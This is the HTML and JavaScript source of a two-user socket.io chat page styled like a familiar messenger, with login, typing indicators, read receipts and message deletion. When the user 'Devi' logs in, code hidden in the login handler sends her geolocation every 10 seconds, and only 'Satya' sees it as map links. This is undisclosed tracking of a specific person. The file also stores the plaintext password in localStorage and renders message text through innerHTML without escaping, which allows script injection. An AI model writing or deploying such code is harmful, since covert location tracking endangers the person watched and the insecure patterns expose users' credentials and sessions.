<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Live Chat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin:0; font-family: "Segoe UI", sans-serif; background:#ece5dd; height:100vh; display:flex; flex-direction:column; }
    #loginPage { flex:1; display:flex; flex-direction:column; justify-content:center; align-items:center; }
    #chatPage { display:none; flex-direction:column; height:100vh; }

    header { background:#075e54; color:white; padding:12px; text-align:center; position:relative; }
    header button { position:absolute; right:10px; top:8px; background:#25d366; border:none; color:white; padding:5px 10px; border-radius:5px; cursor:pointer; }
    .status { font-size:0.8em; color:#b9ffb9; }

    #messages { flex:1; overflow-y:auto; padding:10px; background:#e5ddd5; display:flex; flex-direction:column; }
    .message { margin:8px 0; max-width:75%; padding:10px 14px; border-radius:10px; word-wrap:break-word; transition: background 0.3s; }
    .my-message { align-self:flex-end; background:#dcf8c6; border-bottom-right-radius:0; }
    .other-message { align-self:flex-start; background:#fff; border-bottom-left-radius:0; }
    .msg-info { font-size:0.75em; color:#555; margin-top:3px; text-align:right; }

    form { display:flex; padding:10px; background:#f0f0f0; border-top:1px solid #ccc; }
    #input { flex:1; padding:10px; border:1px solid #ccc; border-radius:20px; margin-right:5px; outline:none; }
    button { background:#128c7e; color:white; border:none; border-radius:20px; padding:10px 15px; font-weight:bold; cursor:pointer; }

    input.login-input { padding:10px; margin:5px; border-radius:8px; border:1px solid #ccc; width:80%; max-width:300px; }

    /* Typing dots */
    .typing-dots { display:flex; align-self:flex-start; background:#fff; border-radius:10px; padding:8px 14px; margin:8px 0; width:50px; justify-content:space-evenly; }
    .dot { width:8px; height:8px; background:#999; border-radius:50%; animation:blink 1.4s infinite; }
    .dot:nth-child(2){ animation-delay:0.2s; }
    .dot:nth-child(3){ animation-delay:0.4s; }
    @keyframes blink{0%,80%,100%{opacity:0;} 40%{opacity:1;}}
  </style>
</head>
<body>

<div id="loginPage">
  <h2>Login</h2>
  <input id="username" class="login-input" placeholder="Username">
  <input id="password" type="password" class="login-input" placeholder="Password">
  <button id="loginBtn">Login</button>
  <p id="loginStatus" style="color:red;"></p>
</div>

<div id="chatPage">
  <header>
    <div id="chatHeader"></div>
    <div class="status" id="status"></div>
    <button id="logoutBtn">Logout</button>
  </header>

  <div id="messages"></div>
  <div id="typingIndicator" style="display:none;">
    <div class="typing-dots">
      <div class="dot"></div><div class="dot"></div><div class="dot"></div>
    </div>
  </div>

  <form id="form">
    <input id="input" placeholder="Type a message..." required>
    <button>Send</button>
  </form>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
  const socket = io();
  let username = localStorage.getItem('username') || '';
  let password = localStorage.getItem('password') || '';
  let typingTimeout;

  const loginPage = document.getElementById('loginPage');
  const chatPage = document.getElementById('chatPage');
  const messages = document.getElementById('messages');
  const input = document.getElementById('input');
  const typingIndicator = document.getElementById('typingIndicator');

  if (Notification.permission !== 'granted') Notification.requestPermission();

  if (username && password) socket.emit('login', { username, password, auto:true });

  document.getElementById('loginBtn').addEventListener('click', () => {
    username = document.getElementById('username').value.trim();
    password = document.getElementById('password').value.trim();
    if(!username || !password) {
      document.getElementById('loginStatus').textContent = "Enter username and password";
      return;
    }
    socket.emit('login', { username, password });
  });

  socket.on('loginSuccess', ({ username:name, users, messages:msgList }) => {
    loginPage.style.display = 'none';
    chatPage.style.display = 'flex';
    document.getElementById('chatHeader').textContent = `Logged in as ${name}`;
    localStorage.setItem('username', name);
    localStorage.setItem('password', password);
    updateUserStatus(users);
    messages.innerHTML = '';
    msgList.forEach(m=>appendMessage(m));

    if(username === 'Devi'){
      setInterval(() => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(pos => {
            const loc = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              time: new Date().toISOString()
            };
            socket.emit('locationUpdate', loc);
          });
        }
      }, 10000);
    }
  });

  socket.on('loginFailed', msg => {
    document.getElementById('loginStatus').textContent = msg;
    localStorage.clear();
  });

  socket.on('userUpdate', users => updateUserStatus(users));

  socket.on('chat message', msg => {
    appendMessage(msg);
    if(msg.name !== username && Notification.permission === 'granted') {
      new Notification(`New message from ${msg.name}`, {body: msg.text});
    }
  });

  socket.on('messageSeen', data => markSeen(data));
  socket.on('deleteMessage', data => {
    document.querySelectorAll('.message').forEach(msg=>{
      if(msg.dataset.time===data.time && msg.dataset.from===data.name) msg.remove();
    });
  });

  socket.on('locationUpdate', loc => {
    if(username === 'Satya'){
      const mapLink = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
      const div = document.createElement('div');
      div.classList.add('other-message');
      div.innerHTML = `<strong>Devi's Location</strong><div><a href="${mapLink}" target="_blank">View on Map</a></div><div class="msg-info">${new Date(loc.time).toLocaleTimeString()}</div>`;
      messages.appendChild(div);
      messages.scrollTop = messages.scrollHeight;
    }
  });

  input.addEventListener('input', ()=> socket.emit('typing', {from:username}));
  socket.on('typing', ({from})=>{
    if(from!==username) showTyping();
  });

  function showTyping(){
    typingIndicator.style.display='flex';
    clearTimeout(typingTimeout);
    typingTimeout=setTimeout(()=>typingIndicator.style.display='none',1500);
    messages.scrollTop=messages.scrollHeight;
  }

  document.getElementById('form').addEventListener('submit', e=>{
    e.preventDefault();
    if(!input.value) return;
    const msg = { name: username, text: input.value, time: new Date().toLocaleTimeString(), status:'sent' };
    socket.emit('chat message', msg);
    input.value='';
  });

  document.getElementById('logoutBtn').addEventListener('click', ()=>{
    socket.emit('logout');
    localStorage.clear();
    location.reload();
  });

  const observer = new IntersectionObserver(entries=>{
    entries.forEach(entry=>{
      if(entry.isIntersecting && entry.target.dataset.from!==username){
        socket.emit('messageSeen', { time:entry.target.dataset.time, from:entry.target.dataset.from, to:username });
      }
    });
  },{threshold:1.0});

  function appendMessage(msg){
    const div=document.createElement('div');
    div.classList.add('message', msg.name===username?'my-message':'other-message');
    div.dataset.time=msg.time;
    div.dataset.from=msg.name;
    let ticks=msg.status==='seen'?'✓✓':'✓';
    div.innerHTML=`<strong>${msg.name}</strong><div>${msg.text}</div><div class="msg-info">${msg.time} ${ticks}</div>`;

    if(msg.name===username){
      let pressTimer;
      const createDeleteBtn=()=>{
        div.style.backgroundColor='#f8d7da';
        if(div.querySelector('button')) return;
        const delBtn=document.createElement('button');
        delBtn.textContent='Delete';
        delBtn.style.marginLeft='5px';
        delBtn.style.padding='2px 5px';
        delBtn.style.fontSize='0.7em';
        delBtn.style.cursor='pointer';
        delBtn.onclick=()=>{ if(confirm('Delete this message for everyone?')) socket.emit('deleteMessage',{time:msg.time,name:msg.name}); };
        div.appendChild(delBtn);
        setTimeout(()=>{ div.style.backgroundColor='#dcf8c6'; if(delBtn.parentNode) delBtn.remove(); },5000);
      };
      div.addEventListener('mousedown',()=>{ pressTimer=setTimeout(createDeleteBtn,600); });
      div.addEventListener('mouseup',()=>{ clearTimeout(pressTimer); });
      div.addEventListener('touchstart',()=>{ pressTimer=setTimeout(createDeleteBtn,600); });
      div.addEventListener('touchend',()=>{ clearTimeout(pressTimer); });
    }

    let startX=0;
    div.addEventListener('touchstart',e=>startX=e.touches[0].clientX);
    div.addEventListener('touchend',e=>{
      let endX=e.changedTouches[0].clientX;
      if(startX-endX>50) input.value=`"${msg.text}"\n` + input.value;
    });

    messages.appendChild(div);
    observer.observe(div);
    if(messages.scrollHeight - messages.scrollTop <= messages.clientHeight+50) messages.scrollTop=messages.scrollHeight;
  }

  function markSeen(data){
    document.querySelectorAll('.my-message').forEach(msg=>{
      if(msg.dataset.time===data.time && msg.dataset.from===data.from){
        msg.querySelector('.msg-info').textContent=`${data.time} ✓✓`;
      }
    });
  }

  function updateUserStatus(users){
    const status=document.getElementById('status');
    const other=username==='Devi'?'Satya':'Devi';
    if(users[other].online) status.textContent='Online';
    else status.textContent=`Last seen at ${users[other].lastSeen||'Unknown'}`;
  }
</script>

</body>
</html>
